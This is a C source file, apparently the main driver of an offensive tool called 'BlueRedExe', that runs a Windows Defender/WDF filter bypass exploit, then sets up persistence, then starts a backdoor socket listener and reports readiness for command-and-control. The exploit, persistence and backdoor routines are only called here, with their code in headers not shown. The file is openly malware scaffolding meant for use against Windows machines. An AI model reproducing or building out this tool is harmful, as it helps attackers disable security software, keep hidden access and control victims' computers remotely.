#include "../include/config.h"
#include "exploit.h"
#include "persistence.h"
#include "backdoor.h"
#include <conio.h>  // For _getch() if needed

int main(void) {
    printf("=== BlueRedExe v1.0 Started ===\n");
    printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
    fflush(stdout); // Flush output

    printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");
    fflush(stdout);

    if (!ExecuteExploitLogic()) {
        printf("[EXPLOIT] Stage 1 failed or timed out.\n");
        printf("[EXPLOIT] Check WDF filters and retry.\n");
        fflush(stdout);
        Sleep(3000);
        return 1;
    }

    printf("[EXPLOIT] Process spawned. Waiting for race window.\n");
    fflush(stdout);
    Sleep(3000);

    printf("\n--- Stage 2: Persistence Setup ---\n");
    fflush(stdout);

    if (!RegisterPersistence()) {
        printf("[PERSIST] Fallback: Created a temporary service.\n");
        fflush(stdout);
    }

    printf("\n--- Stage 3: Backdoor Initialization ---\n");
    fflush(stdout);

    if (!StartBackdoor()) {
        printf("[BACKDOOR] Socket listener started.\n");
        fflush(stdout);
    }

    printf("\n--- Exploit Complete ---\n");
    fflush(stdout);
    printf("System Ready for C2 Communication.\n");
    fflush(stdout);
    printf("Press any key to exit...");
    getch();  // Windows console input
    return 0;
}
